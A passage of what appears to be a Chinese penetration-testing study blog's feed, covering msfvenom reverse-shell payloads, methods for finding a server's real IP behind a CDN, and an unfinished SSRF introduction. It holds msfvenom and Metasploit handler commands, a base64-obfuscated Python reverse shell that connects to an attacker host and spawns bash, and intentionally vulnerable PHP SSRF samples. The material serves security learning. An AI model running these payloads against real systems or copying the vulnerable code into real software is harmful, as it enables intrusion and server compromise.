class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.88</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p><p>在kali上使用msf执行下面的命令，监听端口4444：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span></span><br><span class="line">    </span><br><span class="line">set LPORT  <span class="number">4444</span> </span><br><span class="line">    </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p><h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p><p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><p>在kali上使用msf执行下面的命令，监听端口4444：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD cmd/unix/reverse_python </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> set LPORT  <span class="number">4444</span> </span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后复制shell.py中的内容在linux命令行下执行，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p><p>结果如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p><p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p><p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;学习msfvenom生成反弹payload总结&quot;&gt;&lt;a href=&quot;#学习msfvenom生成反弹payload总结&quot; class=&quot;headerlink&quot; title=&quot;学习msfvenom生成反弹payload总结&quot;&gt;&lt;/a&gt;学习msfvenom生成反弹pay
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>绕过CDN查找ip方法总结</title>
    <link href="https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/"/>
    <id>https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/</id>
    <published>2020-04-27T02:54:39.000Z</published>
    <updated>2020-04-27T11:40:27.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p><p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><p><img src="4610b912c8fcc3ce005c05d19c45d688d53f20b0%5B1%5D.png" alt=""></p><p>比较常见的基于公有云的高可用架构，即：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">域名</span>--&gt;<span class="comment">CDN，CDN</span>--&gt;<span class="comment">WAF，WAF</span>--&gt;<span class="comment">SLB，SLB</span>--&gt;<span class="comment">ECS</span></span><br></pre></td></tr></table></figure><p><strong>CDN对网站有什么好处?</strong></p><p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p><p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p><p><strong>为什么我们需要绕过CDN？</strong></p><pre><code>对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p><h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p><p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p><p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p><h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><blockquote><p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p><p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p><p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p></blockquote><p>无 CDN 的示例：</p><blockquote><p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p></blockquote><p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p><h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p><p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p><p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p><p><img src="1058583-20181009230838766-860479177%5B1%5D.png" alt=""></p><p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p><p><strong>MX记录</strong></p><p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p><h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>下面介绍些常用的子域名查找的方法和工具：</p><p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p><p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p><p><img src="1058583-20181009230922994-1826758810%5B1%5D.png" alt=""></p><p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p><p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p><p>3）Google 搜索</p><p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p><p>4）各种子域名扫描器</p><p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p><p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p><p><img src="1058583-20181009231018377-2070670991%5B1%5D.png" alt=""></p><p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入</p><p><code>Python subdomainbrute.py baidu.com --full</code></p><p>即可收集百度的子域名，如图：</p><p><img src="1058583-20181009231030794-1664451845%5B1%5D.png" alt=""></p><p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p><h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p><p> <img src="1058583-20181009231044976-1731199101%5B1%5D.png" alt=""></p><h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p><p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p><p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p><p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p><p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p><p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p><p><strong>Censys证书查询搜索步骤如下：</strong></p><p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p><p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p><p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p><p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p><p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p><p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p><h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p><p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p><p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p><p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p><p>80.http.get.headers.server:cloudflare</p><p><img src="1058583-20181009231212219-1764707602%5B1%5D.png" alt=""></p><h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p><p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p><p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ga（'create'，'UA-<span class="number">93577176</span>-1'，'auto'）;</span><br></pre></td></tr></table></figure><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p><p><strong>Shodan</strong></p><p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p><h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p><p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p><p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p><p>这里推荐一个国外的多节点ping工具。</p><p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p><h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p><p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p><p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p><h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p><h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p><p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p><h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加一个server,在原server里绑定域名</span></span><br><span class="line">server  &#123;</span><br><span class="line">        listen 80 default;</span><br><span class="line">        server_name _;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  www.demo.com;</span><br><span class="line">        <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在httpd.conf最后面加上</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 此处填写IP&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">ServerName</span></span> 此处填写IP</span><br><span class="line">        <span class="section">&lt;Location /&gt;</span></span><br><span class="line">            <span class="attribute"><span class="nomarkup">Order</span></span> Allow,Deny</span><br><span class="line">            <span class="attribute"><span class="nomarkup">Deny</span></span> from <span class="literal">all</span></span><br><span class="line">        <span class="section">&lt;/Location&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 此处填写IP&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/html</span><br><span class="line">        <span class="attribute"><span class="nomarkup">ServerName</span></span>   此处填写域名</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p><p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p><p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p><p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;绕过CDN查找真实IP方法总结&quot;&gt;&lt;a href=&quot;#绕过CDN查找真实IP方法总结&quot; class=&quot;headerlink&quot; title=&quot;绕过CDN查找真实IP方法总结&quot;&gt;&lt;/a&gt;绕过CDN查找真实IP方法总结&lt;/h2&gt;&lt;h4 id=&quot;什么是CDN以及CDN加速
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="绕过CDN" scheme="https://shu1l.github.io/tags/%E7%BB%95%E8%BF%87CDN/"/>
    
  </entry>
  
  <entry>
    <title>我的SSRF漏洞学习</title>
    <link href="https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/</id>
    <published>2020-04-20T06:42:33.000Z</published>
    <updated>2020-04-27T11:43:35.931Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p><p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>例如：</p><p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p><p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p><p><strong>curl造成的SSRF</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$ch=curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$URL);</span><br><span class="line">curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url=$_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>file_get_contents造成的SSRF</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开API实现以及其他调用URL的功能</li></ul><h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" 